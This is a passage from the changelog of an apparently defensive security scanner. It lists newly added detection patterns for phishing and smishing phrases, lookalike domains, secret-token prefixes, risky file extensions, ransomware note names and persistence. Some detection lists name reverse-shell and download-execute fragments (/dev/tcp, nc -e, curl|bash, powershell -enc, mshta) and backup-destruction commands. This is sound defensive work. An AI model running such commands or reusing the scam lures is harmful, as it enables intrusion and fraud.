- **URL: FREE_HOSTS expanded — 000webhostapp, wixsite, weebly, godaddysites,
  mystrikingly, sites.google.com** (GAP-URL-FREEHOST): Brand phishing on these
  heavily-abused platforms now correctly ISOLATE(90). `microsoft-login.000webhostapp.com`
  improved from LOG(35) to ISOLATE(90).
- **Text: HMRC/CRA/ATO tax-authority impersonation detection** (GAP-TEXT-TAXAUTH):
  Added `hmrc`, `inland revenue`, `canada revenue agency`, `australian taxation
  office` to AUTHORITY_WORDS; added `tax refund`, `tax rebate`, `unclaimed tax
  refund`, `tax overpayment` to BAIT_WORDS. HMRC smishing now BLOCK(79), CRA
  smishing BLOCK(69), IRS smishing with URL ISOLATE(81).
- **Text: Amazon Prime / subscription renewal BazarCall detection**
  (GAP-TEXT-SUBSCRIB): Added `subscription is up for renewal`, `up for renewal`,
  `renewal has been processed`, `auto-renewed`, `membership renewal` to
  CALLBACK_PHISH_WORDS. Amazon Prime renewal vishing improved from LOG(38)
  to ISOLATE(83).
- **Text: delivery smishing — "attempted delivery" patterns** (GAP-TEXT-DELIVERY):
  Added `we attempted delivery`, `attempted delivery of your`, `delivery attempt
  failed`, `failed delivery attempt`, `we tried to deliver`, `unable to deliver
  your` to CALLBACK_PHISH_WORDS. USPS attempted-delivery smishing now LOG(15)
  instead of OK(0).
- **Text: upfront-fee job fraud / starter kit scam** (GAP-TEXT-JOBSCAM):
  Added `starter kit`, `reimbursed on first paycheck`, `purchase the equipment`,
  `equipment deposit required` and related phrases to GROOMING_WORDS. Fake job
  starter-kit scam with multiple signals now ALERT(40).
- **File: EXECUTABLE_EXTS expanded** (GAP-FILE-EXT2): Added `.one`/`.onetoc2`
  (OneNote embedded-attachment execution, top 2022-2023 vector), `.iso`/`.img`/
  `.vhd`/`.vhdx` (MOTW bypass disk containers), `.ppsm`/`.potm` (macro-enabled
  PowerPoint), `.iqy` (Excel Internet Query remote-execute), `.theme`/`.themepack`
  (ThemeBleed NTLM theft, CVE-2023-38146). Removed duplicate `.wsc` entry.
  F4 macro check extended to `.ppsm` and `.potm`.
- **File: BAIT_WORDS (LURE_WORDS)** — `customs fee` standalone added to
  CALLBACK_PHISH_WORDS for USPS smishing detection without "required" qualifier.
- **Secrets: DigitalOcean PAT, Atlassian API token, 1Password token**
  (GAP-SECRETS-EXPAND3): Added `dop_v1_` (DigitalOcean PAT), `ATATT` prefix
  (Atlassian/Jira/Confluence API token), `ops_v` (1Password service account
  token) to SECRET_PATTERNS. All three now ISOLATE(85) on bare token exposure.
- **Paste: P10 persistence injection** (GAP-PASTE-PERSIST): New P10 check
  detects SSH authorized_keys append, crontab persistence injection, and shell
  startup-file backdoor injection in clipboard payloads. Scores +50 (ALERT to
  ISOLATE when combined with other signals). FP guard: legitimate `ssh-copy-id`
  stays OK(0).
- **Protect: 2024-2025 ransomware note filenames** (GAP-PROTECT-RANSOM):
  Added ALPHV/BlackCat (`alphv_note.txt`, `blackcat_note.txt`), LockBit 3.0
  (`lockbit-readme.txt`), Nitrogen, Arkana, BEAST, SafePay, Play note filenames
  to RANSOM_NOTE_NAMES.

### Changed
- Version bumped from 0.9.94 to 0.9.95.

## [0.9.94] — 2026-06-13

### Security
- **Audit: A8 systemd user-unit persistence check** (GAP-AUDIT-A8):
  Scans `$HOME/.config/systemd/user/` for `.service`, `.timer`, and `.socket`
  unit files whose `ExecStart`/`ExecStartPre`/`ExecStop` lines contain the
  same dangerous patterns already guarded in A4 cron (`curl|bash`, `wget`,
  `base64 -d`, `/dev/tcp/`, `nc -e`, etc.). Attackers plant user-level
  systemd units to achieve login-persistent backdoors without root. Uses
  `O_NOFOLLOW|O_NONBLOCK` + `S_ISREG` guard (same pattern as A4) to prevent
  FIFO-block or symlink-redirect during the scan. Wired into `hlse_audit_all`.
  Header and file-level comment updated to document A6-A8.
- **URL: add chatgpt and gemini to BRANDS** (GAP-URL-AI-BRANDS):
  `chatgpt-login-verify.com` scored LOG(35); it now scores BLOCK(70).
  `chatgpt.com.free-upgrade.net` now scores BLOCK(65) via subdomain spoof.
  Legit `chatgpt.com` and `chat.openai.com` stay OK(0).
- **File: add .xll, .wll, .chm, .rdp, .sct, .job to EXECUTABLE_EXTS**
  (GAP-FILE-EXT): Excel/Word add-ins (shellcode delivery), Compiled HTML
  Help (hhctrl.ocx JScript), Remote Desktop files (auto-connect exploit),
  Windows Script Component, and Task Scheduler jobs. Double-extension
  masquerades (e.g. `invoice.pdf.rdp`) now score ISOLATE(85).
- **Text: MFA push-bombing, IT helpdesk impersonation, OTP relay**
  (GAP-TEXT-MFA): Added MFA fatigue phrases (`approve the notification`,
  `approve the sign-in request`, `just approve it`) to FAKE_ALERT_WORDS,
  IT helpdesk/department impersonation phrases (`this is your IT helpdesk`,
  `from IT security`, `corporate IT team`) to AUTHORITY_WORDS, and OTP
  relay phrases (`read me the code`, `tell me the code sent to you`) to
  FAKE_ALERT_WORDS. New `authority + bait` amplifier escalates IT-helpdesk +
  credential-harvest combinations from LOG(37) to ALERT(57). 2 CLI tests
  added (94 → 96).

### Changed
- Version bumped from 0.9.93 to 0.9.94.
- CLI integration tests: 94 → 96.

## [0.9.93] — 2026-06-11

### Security
- **Text: ClickFix / fake-CAPTCHA "paste-and-run" detection** (GAP-TEXT-CLICKFIX):
  Added a dedicated `ClickFix paste-and-run` signal targeting the top
  2024-2025 initial-access vector, where a fake "verify you are human" page
  tells the victim to press Win+R, paste an attacker-supplied PowerShell/mshta
  command, and press Enter. Signal matches high-specificity paste-execute
  instructions and living-off-the-land payload markers (`powershell -enc`,
  `mshta`, `invoke-expression`, `iex(`, `certutil -urlcache`). Amplifiers
  escalate to BLOCK/ISOLATE when combined with fake-CAPTCHA framing or a
  run-dialog invocation. Run-dialog phrases (Win+R) are intentionally kept
  out of the base signal — they are dual-use, so a legitimate IT instruction
  ("press Win+R, type cmd") stays OK while the paste-execute variant is
  flagged. Two CLI integration tests lock in both the detection and the
  FP guard.
- **Secrets: HashiCorp + AI + observability tokens** (GAP-SECRETS-EXPAND2):
  Added `VAULT_TOKEN`, `CONSUL_HTTP_TOKEN`, `NOMAD_TOKEN`, `BOUNDARY_TOKEN`
  (HashiCorp secrets management/orchestration), `GEMINI_API_KEY`,
  `GOOGLE_GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `VERTEX_AI_KEY` (AI
  providers), and `PAGERDUTY_API_KEY`, `PAGERDUTY_TOKEN`, `OPSGENIE_API_KEY`,
  `GRAFANA_API_KEY` (incident/observability) to the ENV_SECRET watchlist.
- **URL: crypto-wallet brands + airdrop scam term** (GAP-URL-WEB3):
  Added `trezor`, `trustwallet`, `opensea`, `uniswap`, `pancakeswap`,
  `blockchain` to BRANDS (wallet-draining/seed-phrase phishing targets) and
  `airdrop` to SECURITY_WORDS. `airdrop` is overwhelmingly scam-correlated
  and near-absent from benign hyphenated registrable domains; generic terms
  like `wallet` were intentionally omitted to avoid FPs on legitimate
  `crypto-wallet-news.com`-style domains.
- **Supply: web3/crypto package watchlists** (GAP-SUPPLY-WEB3):
  Added `ethers`, `web3`, `wagmi`, `viem`, `hardhat`, `@solana/web3.js`,
  `@walletconnect/client`, `web3modal` (npm) and `web3`, `eth-account`,
  `eth-utils`, `web3py`, `solana`, `bitcoinlib` (pip). Wallet-drainer malware
  routinely ships as typosquats of these packages.
- **Text: toll-road / DMV smishing detection** (GAP-TEXT-TOLL):
  Added the FBI IC3 top-volume 2024-2025 smishing cluster (E-ZPass / FasTrak
  / SunPass / The Toll Roads impersonation: `unpaid toll`, `outstanding
  toll`, `toll balance`, `e-zpass`, `fastrak`, `sunpass`, `the toll roads`,
  …) and the 2025 DMV/registration successor wave (`registration will be
  suspended`, `dmv final notice`, `unpaid traffic ticket`) to the
  Callback/TOAD/smishing signal. Previously an E-ZPass lure scored OK(0);
  it now reaches ALERT(58), and a full toll lure with a payment URL reaches
  BLOCK(71). A single benign toll-brand mention stays at LOG(15) — it only
  escalates when combined with the urgency/payment/URL scam signature, so
  legitimate account messages are not flagged.

### Changed
- Version bumped from 0.9.92 to 0.9.93.
- CLI integration tests: 90 → 94 (ClickFix detection + FP guard, toll
  smishing detection + FP guard).

## [0.9.92] — 2026-06-10

### Security
- **URL: Trusted hosts expansion** (GAP-URL-TRUSTEDHOSTS):
  Added `microsoftonline.com`, `microsoft365.com`, `icloud.com` to TRUSTED_HOSTS.
  These legitimate Microsoft/Apple auth endpoints were scoring LOG(15) due to
  `/oauth` and `/signin` path patterns; now suppressed as expected.

- **URL: microsoftonline typosquat detection** (GAP-URL-MSONLINE):
  Added `microsoftonline` to BRANDS. `microsoft0nline.com` / `microsofton1ine.com`
  are now caught by the homoglyph and typosquat detectors at BLOCK(60+).

- **URL: Hyphenated subdomain spoof detection** (GAP-URL-SUBSPOOF):
  Extended `detect_subdomain_spoof()` to match brand names as hyphen-delimited
  tokens within subdomain labels. Previously `paypal-verify.login.net` and
  `microsoft365-sso.login.net` escaped detection; now both score ALERT(50).

- **Supply: Cargo ML/crypto crate watchlist expansion** (GAP-SUPPLY-CARGO):
  Added ML inference crates: `candle-core`, `candle-nn`, `candle-transformers`,
  `burn`, `burn-core`, `burn-tensor`, `ort`, `ndarray`, `linfa`.
  Added PKI/crypto crates: `rcgen`, `webpki`, `x509-parser`, `p256`,
  `ed25519-dalek`, `chacha20poly1305`, `argon2`, `pbkdf2`.

- **Supply: npm utility package watchlist expansion** (GAP-SUPPLY-NPM):
  Added `semver`, `minimist`, `node-fetch`, `cross-fetch`, `node-cache`,
  `winston`, `morgan`, `multer`, `socket.io-client`, `ws`, `got`, `supertest`,
  `aws-cdk`, `serverless`, `netlify-cli`, `vercel` — high-download packages
  absent from watchlist but targeted in active typosquat campaigns.

- **Protection: 2025 ransomware families** (GAP-PROTECT-RW2025B):
  Added extensions: `.hellcat`, `.blacklock`, `.eldorado`, `.apt73`.
  Added note filenames: `hellcat_readme.txt`, `blacklock_readme.txt`, `eldorado_readme.txt`.

- **Secrets: AI provider token patterns** (GAP-SECRET-AIPROVIDERS):
  Added explicit ENV_SECRET patterns for `GROQ_API_KEY`, `PERPLEXITY_API_KEY`,
  `DEEPSEEK_API_KEY`, `XAI_API_KEY`, `FIREWORKS_API_KEY`, `ANYSCALE_API_KEY`.

- **Text: Tech-support scam detection improvement** (GAP-TEXT-TECHSUPPORT):
  Added FAKE_ALERT_WORDS: "your computer has been infected", "your device has been
  infected", "at 1-800-", "at 1-888-", "at 1-877-" etc. — catches tech-support
  pop-up scam templates where toll-free number follows "contact us at" rather
  than "call".

- **Text: Investment/pig-butchering word-order variants** (GAP-TEXT-INVEST):
  Added GROOMING_WORDS: "returns guaranteed", "profits guaranteed", "100% safe",
  "100% guaranteed", "zero risk", "earn per week", "earn per day", "earn daily",
  "passive income guaranteed", "passive earning" — scam templates reverse
  "guaranteed returns" to evade naive pattern matching.

- **Text: Sign-in variant and customs duty detection** (GAP-TEXT-SIGNIN):
  Added FAKE_ALERT_WORDS: "unusual sign-in detected", "suspicious sign-in detected",
  "sign-in attempt detected", "login attempt detected".
  Added CALLBACK_PHISH_WORDS: "customs duty", "import duty" (USPS/FedEx smishing).

- **Text: Fake-order callback phrase gaps** (GAP-TEXT-FAKEORDER):
  Added FAKE_ALERT_WORDS: "if you did not place this order", "if you didn't place
  this order", "charge you did not authorize", "charge you did not make" —
  covers callback phishing TOAD templates that phrase fake-charge alerts
  differently from existing patterns.

### Changed
- Version bumped from 0.9.91 to 0.9.92.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.91] — 2026-06-10

### Security
- **URL: Add malware delivery path patterns** (GAP-URL-MALWARE-PATHS):
  Added `/setup`, `/installer`, `/update.exe`, `/setup.exe` to PATH_PATTERNS.
  Combined with a suspicious TLD these push suspicious domains to ALERT tier.
  Example: `evil.xyz/download/update.exe` → ALERT(43).
  Trusted hosts (github.com, etc.) are unaffected by the O_NOFOLLOW guard.

- **Supply: Add Azure SDK packages to PIP_TOP watchlist** (GAP-SUPPLY-AZURE):
  Added `azure-core`, `azure-storage-blob`, `azure-identity`,
  `azure-keyvault-secrets`, `azure-mgmt-core` — high-value enterprise targets
  with documented typosquat campaigns (e.g. `azure-corr`, `azure-identty`).
  Also added `sentry-sdk`, `opentelemetry-api` (active typosquat campaigns).

- **Text: Add domain-expiry extortion scam patterns** (GAP-TEXT-DOMAINEXPIRY):
  Added URGENCY_WORDS: `final notice`, `last notice`,
  `domain will expire`, `domain expires`, `domain expiration`,
  `website will be taken down`, `hosting will be suspended`.
  These cover fake domain-expiry extortion scams that demand payment or
  account-recovery action under artificial time pressure.
  Test: "Final notice: your domain will expire in 24 hours." → LOG(24).

### Changed
- Version bumped from 0.9.90 to 0.9.91.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.90] — 2026-06-10

### Security
- **File: Add macro-enabled Office and macOS pkg to executable extension list** (GAP-FILE-MACRODOC):
  `.docm`, `.xlsm`, `.pptm`, `.xlam`, `.ppam`, `.xlsb` (macro-enabled Office) and
  `.pkg`, `.mpkg` (macOS installer) were not in EXECUTABLE_EXTS. They now score
  SAFE(5) for extension alone and participate in lure-word detection. Examples:
  `hr_policy_2024.docm` → ALERT(45), `chrome_update.pkg` → ALERT(45).
  Added lure words: `readme`, `report`, `notification`, `policy`, `hr`, `compliance`,
  `legal`, `notice` — catching `README_important.exe` → ALERT(45).

- **Secrets: Add 22 missing ENV_SECRET patterns** (GAP-SECRET-ENVVARS):
  Added: Azure Storage connection string / account key / Cognitive / OpenAI key;
  Google API key, GCP API key, Firebase API key, Google Maps API key;
  S3 access/secret key variants; Notion token, Airtable PAT, Jira cloud token,
  Zendesk API token, Intercom access token, HubSpot API key,
  Salesforce access token; Mapbox access token, HERE API key;
  Twilio API key, Vonage API secret.

## [0.9.89] — 2026-06-10

### Security
- **Email E1: Fix brand-department display-name false positives** (BUG-EMAIL-E1-BRANDDEPT):
  The E1 display-name check used a flat keyword list that included generic role words
  ("support", "security", "admin", "helpdesk") alongside brand names. This caused
  "Apple Support" from apple.com, "Twitter Security" from twitter.com, and
  "Apple" from icloud.com to all score BLOCK(65) — false positives. Two fixes:
  (1) Added `brand_owns_domain(brand, domain)` with suffix-based matching (not substring)
  and a trusted-alternate-domain table (Apple→icloud.com/me.com, Amazon→amazonses.com,
  Facebook→facebookmail.com, Twitter→twitteremail.com/x.com, etc.). Uses "ends with"
  semantics so `accountprotection.microsoft.com` is trusted but `microsoft-verify.ru`
  is NOT.
  (2) Added `is_generic_display_role()` to suppress generic functional words when
  the primary brand already owns the From domain. Malicious senders (apple-verify.ru,
  microsoft-support.info) still trigger BLOCK(65). Added 3 regression tests.
  Secrets tests: 52 → 55.

## [0.9.88] — 2026-06-10

### Security
- **Text: Detect subscription-expiry and tech-support refund scam patterns** (GAP-TEXT-SUBSCRIP):
  Added URGENCY_WORDS: `click here to renew`, `account will be cancelled`,
  `will be automatically cancelled`, `membership expires in`, `membership will expire`,
  `subscription will expire`. Added BAIT_WORDS: `update your payment information`,
  `verify your payment information`, `confirm your payment information`,
  fake-charge indicators (`we have charged $`, `we have charged your`,
  `you have been charged for`, `charged to your account`, `we have debited your`,
  `auto-renewal charge`, `automatic renewal charge`).
  Amazon Prime/Netflix/domain-expiry phishing now scores LOG (was OK(0));
  tech-support refund scam ("We have charged $399, call to cancel") rises to BLOCK(67)
  (was ALERT(55)).  Zero FPs on legitimate charge confirmations and registrar emails.

## [0.9.87] — 2026-06-10

### Security
- **Core: Extend cp_fold() with Armenian and additional Greek/Cyrillic confusables** (GAP-URL-ARMENIAN):
  `cp_fold()` had no entries for Armenian script (even though `cp_script()` already
  classified it as CONFUSABLE). Attacks using Armenian lookalikes — ա (`apple.com`),
  ո (`google.com`), ե, հ — scored only LOG/ALERT(25-40). Added U+0561→'a', U+0565→'e',
  U+0578→'o', U+0570→'h'. Also added Cyrillic Komi De U+0501→'d' (`ԁiscord.com`) and
  Greek chi/omega U+03C7→'x', U+03C9→'w' (`ωhatsapp.com`). All four classes now reach
  BLOCK(60) via brand matching. Added 4 regression tests.

### Changed
- **Supply: Add P9 reverse-shell tests** (TEST-SUPPLY-P9):
  The P9 pastejacking signal (reverse shells: `/dev/tcp`, `nc -e`, Python socket, socat)
  added in v0.9.85 had no dedicated test coverage. Added 4 test cases covering all P9
  detection paths. Supply tests: 30 → 34.

- **Audit: Extend SUSPICIOUS_CRON_PATTERNS** (GAP-AUDIT-CRON):
  Added `xterm -display` (X11 reverse shell) and `msfvenom`/`meterpreter`
  (Metasploit payload indicators) to the cron persistence pattern list.

## [0.9.86] — 2026-06-10

### Security
- **Core: Fix raw-UTF-8 homoglyph blind spot + DRY the confusable table** (BUG-URL-MIXEDSCRIPT):
  `detect_mixed_script` had its own limited inline byte-switch that only
  folded 2-byte Cyrillic (0xD0/0xD1 lead bytes). Greek omicron
  (`gοοgle.com`, 0xCE 0xBF) and other Cyrillic ranges (palochka `ӏ`,
  0xD3 0x8F) collapsed to `?`, so the brand never matched —
  `gοοgle.com` scored only LOG(25) and `paypaӏ.com` ALERT(40). Replaced
  the inline switch with a proper UTF-8 code-point decoder that reuses
  the shared `cp_fold()` table (also extended with в/м/н/т/б/г Cyrillic
  and ι/ν/κ/υ/Β/Ο Greek). `gοοgle.com` → BLOCK(60), `paypaӏ.com` →
  BLOCK(75); legit IDNs (münchen.de, café.fr) stay advisory-only.

- **Secrets: Fix E1 display-name substring false positives** (BUG-EMAIL-E1-FP):
  the email-forensics E1 check matched known-brand tokens as raw
  substrings of the display name — `"First Choice"` matched `irs`
  (f-**irs**-t) and `"Backups Team"` matched `ups`, raising bogus
  IRS/UPS impersonation alerts. Added `contains_word()` (whole-word match
  bounded by non-alphanumerics) on the display-name side; the domain side
  keeps substring matching so lookalike domains embedding the brand
  (paypa1-verify.com) still suppress the alert for the genuine brand.
  Real PayPal/UPS impersonation with a mismatched From still fires E1.

- **Text: Detect Microsoft/Google sign-in-activity phishing** (GAP-TEXT-SIGNIN):
  FAKE_ALERT_WORDS += "unusual/suspicious sign-in activity",
  "new sign-in detected", "your microsoft account", "your google account
  has been". Prevalent template ("We detected unusual sign-in activity…")
  was scoring 0.

- **Text: BEC gift-card, SSA impersonation, billing & subscription gaps**:
  URGENCY_WORDS += "account is on hold", subscription-cancellation
  variants; SECRECY_WORDS += "keep it secret"; AUTHORITY_WORDS +=
  "social security number has been suspended" and SSA variants;
  BAIT_WORDS += "update your payment details". Netflix billing-hold,
  CEO gift-card BEC, and SSA robocall templates now score in band.

- **Text: Wallet-draining, ISP, unauthorized-order, loan & job-scam patterns**:
  FAKE_ALERT_WORDS += crypto wallet-draining ("wallet has been
  compromised", "move your crypto to safety", "coinbase security alert"),
  ISP impersonation ("internet will be disconnected"), unauthorized-order
  fraud ("order you did not authorize", "call our fraud department").
  GROOMING_WORDS += work-from-home and no-credit-check loan fraud openers.

- **Supply: Add P9 reverse-shell detection to pastejacking checker**:
  bash `/dev/tcp` redirect, `mkfifo`+`nc` named-pipe, Python socket
  (`os.dup2`+`connect`), and `socat EXEC:`/`TCP:` reverse shells —
  previously unmatched by the Unix P1–P8 checks.

- **Secrets: MongoDB/connection-string and generic key patterns**:
  ENV_SECRET += `MONGO_URI=`/`MONGO_URL=`, `REDIS_URI=`, MySQL/Postgres/
  MariaDB/CockroachDB/Elasticsearch URLs, `SECRET_KEY_BASE=`, `APP_KEY=`,
  `ENCRYPTION_KEY=`, `MASTER_KEY=`, `SIGNING_SECRET=`. Removed a duplicate
  `SECRET_KEY=` entry.

- **Core: Fix security-word matching and add giveaway/cloud-hosting phishing**:
  SECURITY_WORDS += "security" (was missing — "secure" is not a substring
  of "security"), "verification", "recovery", and giveaway words
  ("free", "giveaway", "nitro", …); PATH_PATTERNS += "/seed", "/mnemonic",
  "/recovery-phrase"; FREE_HOSTS += azurewebsites.net, blob.core.windows.net,
  s3.amazonaws.com, storage.googleapis.com, workers.dev, … Brand-in-subdomain
  phishing on cloud dev hosts now flagged.

- **File: Detect OS/browser update dropper lure names**:
  LURE_WORDS += "windows", "chrome", "firefox", "adobe", "flash", "java",
  "system", "microsoft", "google". `windows_update.exe`,
  `adobe_flash_player.exe`, `chrome_installer.exe` now reach ALERT;
  document files stay clean (lure scoring escalates only with an
  executable extension).

- **Audit: Detect alias hijacking + expand shell-rc coverage**:
  A6 now flags `alias ls/ps/sudo/ssh/...=` whose target invokes
  curl/wget/dev-tcp/nc/eval/base64/grep-v/python/tmp (rootkit file-hiding,
  sudo credential theft). Scanned files += `.bash_logout`, `.zlogin`,
  `.zlogout`, `.config/fish/config.fish`.

- **Protect: Expand anti-recovery commands and UEFI bootkit indicators**:
  R5 += vssadmin/wbadmin/bcdedit/zfs/fsutil/wevtutil backup-destruction
  variants; ESP_INDICATORS += MosaicRegressor, FinSpy, TrickBoot, Glupteba.

### Tests
- 404 structured tests (was 400). Secrets suite 52 (was 50): added E1
  substring-FP regression ("First Choice") and E1 UPS-impersonation tests.
  URL unit suite 33 (was 31): added raw-UTF-8 Greek-omicron and
  Cyrillic-palochka homoglyph regressions.
- F1 = 1.000 on both corpora; ASan/UBSan clean; fuzz 100K, 0 crashes.

## [0.9.85] — 2026-06-10

### Security
- **Text: Fix authority impersonation FP — remove substring-prone acronyms** (BUG-TEXT-IRS-FP):
  `irs` matched "first" (f-**irs**-t), `cia` matched "judicial", etc.
  Replaced standalone 3-letter acronyms with context-bearing phrases:
  "from the irs", "irs agent", "irs notice", "irs investigation", etc.
  IRS impersonation still detected; pig-butchering with "first" no longer
  triggers false Authority hit.

- **Text: Improve BEC authority patterns and wire transfer detection**:
  AUTHORITY_WORDS: added "as the ceo/cfo", "i am the ceo/cfo",
  "on behalf of the ceo", "acting ceo/cfo".
  BAIT_WORDS: added "wire the payment", "wire this payment",
  "process the wire", "send the payment".
  Result: "As the CEO…wire the initial payment" → ALERT[50] (was 0).

- **Text: 2025 smishing and urgency patterns** (GAP-TEXT-CLICKBAIT):
  URGENCY_WORDS: +7 click-bait patterns (click here to verify/confirm).
  CALLBACK_PHISH_WORDS: +12 delivery/USPS smishing variants.

- **Util: Expand benign-magic whitelist to 31 formats** (GAP-UTIL-MAGIC):
  Added OTF/WOFF/WOFF2 fonts, Apache Arrow IPC, DER X.509 certificate,
  Snappy framing format. Prevents false-positive entropy alerts on
  legitimate web fonts and cloud-native data files.

- **File: Add .dll to EXECUTABLE_EXTS; expand LURE_WORDS** (GAP-FILE-DLL):
  .dll now detected in double-extension attacks (document.pdf.dll).
  +9 LURE_WORDS: driver, codec, plugin, proof, memo, hacked, breach, etc.

- **Audit: Expand DNS hosts-poisoning watchlist** (GAP-AUDIT-DNS):
  SENSITIVE_DOMAINS: +16 entries (brokerages, P2P payment, Apple iCloud,
  social/communication platforms, streaming services).

- **Protect: Add 2025 UEFI bootkit indicator strings** (GAP-PROTECT-ESP):
  ESP_INDICATORS: LoJax, MoonBounce, CosmicStrand, ESPectre.

### Tests
- URL unit: 28 → 31 (norton brand, turbotax, pages.dev/wp-admin)
- Text unit: 15 → 18 (BEC, IRS FP regression, smishing)
- Util: 33 → 36 (OTF, WOFF, DER cert)
- Total: 391 → 400 (**milestone: 400 structured tests**)

## [0.9.80] — 2026-06-10

### Security
- **Secrets: SendGrid, HashiCorp Vault batch/recovery, Vercel patterns** (GAP-SECRET-2025):
  Added `SG.` (SendGrid, +85), `hvb.` (Vault batch, +80), `hvr.` (Vault recovery, +80),
  `vercel_token_` (+80). Total patterns: 43 → 47.

- **Audit: A7 sudoers NOPASSWD check** (GAP-AUDIT-SUDOERS): New function
  `hlse_audit_sudoers()` scans `/etc/sudoers` and drop-ins in `/etc/sudoers.d/`
  for `NOPASSWD` entries (+40 HIGH per match). Integrated into `hlse_audit_all()`.
  `HLSE_AUDIT_MAX_FINDINGS` bumped 24 → 32 for 7 modules.

- **Audit: Cloud SDK credential file permissions** (GAP-AUDIT-HOMESECRETS):
  HOME_SECRETS expanded with GCP ADC (`~/.config/gcloud/application_default_credentials.json`),
  GitHub CLI (`~/.config/gh/hosts.yml`), Terraform Cloud (`~/.terraform.d/credentials.tfrc.json`),
  Azure CLI (`~/.azure/credentials`), Heroku (`~/.heroku/credentials.json`).

- **URL: Security software, tax, collaboration brands** (GAP-URL-BRANDS-2):
  BRANDS gains: norton, mcafee, kaspersky, bitdefender, avast, malwarebytes (fake-AV);
  intuit, turbotax, quickbooks (tax phishing); office365, microsoft365,
  microsoftteams (BEC); truist (banking).
  PATH_PATTERNS gains: /wp-admin, /wp-login, /administrator, /oauth, /sso,
  /saml, /forgot, /password-reset.

- **Text: 2024-2025 delivery smishing patterns** (GAP-TEXT-SMISHING):
  CALLBACK_PHISH_WORDS gains 12 USPS/courier smishing variants: "package has been held",
  "customs clearance fee", "pay a small fee", "delivery charge unpaid", etc.
  URGENCY_WORDS gains 7 click-bait variants: "click here to verify/confirm/update",
  "your account will be terminated", etc. Result: USPS smishing → LOG[35] (was 0).

- **Supply: 2025 LOLBin and ransomware** (GAP-SUPPLY-LOLBIN-2025):
  P8 gains: msiexec silent install, expand.exe download, curl/wget→executable.
  RANSOM_EXTENSIONS: +6 families (Cloak, VanHelsing, 3AM, Nitrogen, Arkana, BEAST).
  RANSOM_NOTE_NAMES: +3 (cloak, 3AM, VanHelsing readmes).

## [0.9.75] — 2026-06-09

### Security
- **Secrets: Render, Fly.io, CircleCI, Contentful token patterns** (GAP-SECRET-PATTERNS):
  Added 4 new CI/CD and cloud platform token patterns: `rnd_` (Render, +80),
  `FlyV1` (Fly.io, +85), `CCIPAT_` (CircleCI, +85), `CFPAT-` (Contentful, +85).
  Total patterns: 39 → 43.

- **URL: Government TLD (.gov/.mil/.edu) text-scan suppression** (GAP-URL-GOV-FP):
  `hlse_scan()` now skips the text compound-signal scan for registry-restricted
  TLDs (.gov, .mil, .edu). These TLDs cannot be registered by attackers, so
  authority-impersonation hits (e.g. "irs" in `irs.gov/refund`) were false
  positives. `irs.gov/refund`: ALERT[47] → LOG[15]. Phishing domains like
  `irs-refund-alert.com` still score ALERT[47].

- **URL: Brand/path/TLD expansion** (GAP-URL-BRANDS): Added brands: venmo, zelle,
  cashapp, payoneer, ups, crypto. Added PATH_PATTERNS: /2fa, /otp, /mfa, /kyc,
  /transfer, /wire. Added SUSPICIOUS_TLDS: .sbs, .fit.

- **Audit: SSH X11Forwarding, AllowTcpForwarding, LoginGraceTime checks** (GAP-AUDIT-SSH):
  SSH audit (A1) now detects X11Forwarding yes (+15), AllowTcpForwarding yes (+15),
  LoginGraceTime > 60 or unlimited (+5) — common lateral-movement enablers.

- **Audit: Shell RC PROMPT_COMMAND injection and function override detection** (GAP-AUDIT-SHELLRC):
  A6 shellrc scan now detects `PROMPT_COMMAND=` injection (+40, every-prompt
  payload) and system-command function overrides for ls/ps/top/netstat/etc. (+35).
  Classic rootkit persistence not previously covered.

### Added
- **File: 7-Zip, Cabinet, WebAssembly magic byte detection** (GAP-FILE-MAGIC):
  MAGIC_TABLE gains 7-Zip (6-byte header), Cabinet/MSCF (Windows dropper),
  WebAssembly (\0asm). F2 mismatch: WASM with non-.wasm → +55; Cabinet with
  non-.cab/.msi → +40. Both added to polyglot-with-executable-ext check (+50).

## [0.9.70] — 2026-06-09

### Security
- **URL: IPv6 literal host phishing detection** (GAP-URL-IPV6): The IP-based
  phishing detector (brand-in-path +35, auth-path +15) now also fires on IPv6
  literal hosts (`[2001:db8::1]/paypal/signin`). Previously only IPv4 dot-
  notation was handled. `http://[2001:db8::1]/paypal/signin` now scores ISOLATE
  vs. ALERT before.

## [0.9.69] — 2026-06-09

### Security
- **URL: @ credential trick explicit detection** (GAP-URL-AT): Added dedicated
  check for `@` in URL authority (`https://google.com@evil.com` pattern). Per
  RFC 3986 §3.2.1 the real host is after the @; browsers show the fake brand
  before it. Now scores +45 with a clear message. Self-test case added (25
  cases). Previously detected only indirectly via subdomain-spoof path.

## [0.9.68] — 2026-06-09

### Added
- **Secrets: IaC / CI/CD secret patterns** (GAP-SEC-IAC): Added to
  `env_passwords` watchlist: `TF_VAR_` (Terraform variables), `PULUMI_ACCESS_TOKEN`,
  `PULUMI_CONFIG_PASSPHRASE`, `ARM_CLIENT_SECRET` / `ARM_SUBSCRIPTION_ID`
  (Azure ARM), `GOOGLE_CREDENTIALS` / `GOOGLE_APPLICATION_CREDENTIALS` (GCP),
  `TF_TOKEN_app_terraform_io`, `ACTIONS_RUNTIME_TOKEN` / `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
  (GitHub Actions). Covers IaC credential leakage common in misconfigured CI logs.

## [0.9.67] — 2026-06-09

### Security
- **Ransomware: R5 shadow-deletion scan implemented** (GAP-RS-R5): The R5
  check (`hlse_ransomware_check_shadow_deletion()`) was previously a stub.
  Now scans `/proc/<pid>/cmdline` (O_NOFOLLOW + O_NONBLOCK + S_ISREG guard)
  for vssadmin, wmic shadow, lvremove, bcdedit, wbadmin shadow-deletion
  commands running as live processes. Fires +60 (BLOCK) on detection.

## [0.9.66] — 2026-06-09

### Added
- **Text: emergency/grandparent scam detection** (GAP-TX-EMG): New signal
  `EMERGENCY_SCAM_WORDS` (15 EN + 7 JP phrases) covering the grandparent
  scam (jail/accident + bail + secrecy), lottery release-fee scams, and
  Japanese ore-ore fraud (振り込め詐欺). Base=20, per_hit=15, cap=45.
  Two compound amplifiers in Pass 2: emergency + secrecy → +25 (grandparent
  pattern); emergency + financial/urgency → +20 (bail fraud). Benign accident
  descriptions score SAFE. Grandparent scam text scores ISOLATE. JP ore-ore
  fraud detected via native phrases. P6 FP gate passes.

## [0.9.65] — 2026-06-09

### Added
- **Supply chain: Cargo package set +11** (GAP-SC-CARGO): Added tauri, leptos,
  dioxus, bevy, embassy (embedded), tokio-tungstenite, axum-core, tower-http,
